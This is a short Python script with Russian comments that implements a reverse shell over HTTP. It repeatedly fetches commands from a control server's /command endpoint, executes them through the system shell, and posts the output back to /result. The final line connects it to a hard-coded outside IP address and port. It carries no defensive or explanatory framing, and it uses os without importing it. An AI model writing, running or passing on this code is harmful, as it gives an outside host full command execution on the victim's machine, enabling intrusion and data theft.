import requests
import subprocess
import time

def reverse_shell(server_url):
    while True:
        try:
            # Запрашиваем следующую команду с управляющего сервера
            response = requests.get(f"{server_url}/command")
            if response.status_code != 200:
                time.sleep(5)
                continue

            command = response.text.strip()
            if not command:
                # Если команды нет, подождём перед следующим запросом
                time.sleep(2)
                continue

            # Проверяем команду на завершение работы
            if command.lower() in ("exit", "quit"):
                break

            # Выполняем команду
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    result = f"Changed directory to {os.getcwd()}"
                except FileNotFoundError:
                    result = f"No such directory: {command[3:]}"
            else:
                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                except subprocess.CalledProcessError as e:
                    result = e.output

            # Отправляем результат обратно на сервер
            requests.post(f"{server_url}/result", data={"result": result})
        except Exception as e:
            # В случае ошибки, отправляем сообщение об ошибке
            try:
                requests.post(f"{server_url}/result", data={"result": f"Error: {e}"})
            except:
                pass
            # Ждём перед повтором
            time.sleep(5)

# Укажите URL вашего управляющего сервера
reverse_shell("http://89.207.88.72:47991")
